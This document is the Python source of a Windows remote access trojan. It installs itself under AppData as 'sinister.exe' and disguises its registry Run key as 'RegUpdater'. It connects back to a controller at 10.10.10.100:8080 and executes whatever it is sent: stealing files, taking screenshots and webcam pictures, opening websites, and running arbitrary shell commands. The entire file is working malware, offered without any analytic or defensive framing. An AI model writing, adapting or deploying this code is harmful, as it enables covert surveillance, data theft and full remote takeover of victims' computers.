import socket
import os
import subprocess
from PIL import ImageGrab
import time
import tempfile
import shutil
import _winreg as wreg
import random
import webbrowser
import cv2
import numpy

path = os.getcwd().strip('/n')

Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

destination = userprof.strip('\n\r') + '\\AppData\Local\Microsoft\\' + 'sinister.exe'

if not os.path.exists(destination):

    shutil.copyfile(path+'\sinister.exe', destination)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                       wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()

def pix(s):
        
        dirpath = tempfile.mkdtemp()
        
        cam = cv2.VideoCapture(1)
        time.sleep(.10)
        c, im = cam.read()
        cv2.imwrite("test.jpg", im)
        del cam
        f = open("test.jpg", 'rb')
        pic = f.read(1024)
        while pic != '':
            s.send(pic)
            pic = f.read(1024)
        s.send('done')
        f.close()
        shutil.rmtree(dirpath)

def screenshot(s):

	dirpath = tempfile.mkdtemp()

	ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
	f = open(dirpath + "\img.jpg", 'rb')
	screen = f.read(1024)
	while screen != '':
		s.send(screen)
		screen = f.read(1024)
	s.send('done')
	f.close()
	shutil.rmtree(dirpath)

def transfer(s,path):
	if os.path.exists(path):
		file = open(path, 'rb')
		dataSend = file.read(1024)
		while dataSend != '':
			s.send(dataSend)
			dataSend = file.read(1024)
		s.send('done')
		file.close()
	
	else:
		s.send('Unable to send file')

def connect():
    
	try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('10.10.10.100', 8080))
            
        except socket.error:
            main()
	
	while True:

                try:
                    
                    command = s.recv(1024)
                    
                    if 'terminate' in command:
                            s.close()
                            main()


                    elif 'change' in command:
                            main()
            
                    elif 'grab' in command:
                            grab,path = command.split('*')
                            
                            try:
                                    transfer(s,path)
                                    
                            except Exception, e:
                                    s.send( str(e) )
                                    pass
                            
                    elif 'screenshot' in command:
                            try:
                                    screenshot(s)
                            
                            except Exception,e:
                                    s.send( str(e) )

                    elif 'wCap' in command:

                            pix(s)

                    elif 'cd' in command:
                            code,directory = command.split(' ')
                            os.chdir(directory)
                            s.send('[+] CWD - ' + os.getcwd() )

                    elif 'web' in command:
                            command = command[4:]
                            webbrowser.open(command)
                            s.send('[+] - webite opened')

                    else:
                            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            s.send( cmd.stdout.read() )
                            s.send( cmd.stderr.read() )

                except socket.error, Exception:
                    s.send('Broken pip')
                    s.close()
                    break
        main()
                    



            
		
			
def main():
    sleep = 10
    while True:
        time.sleep(sleep)
        connect()

main()
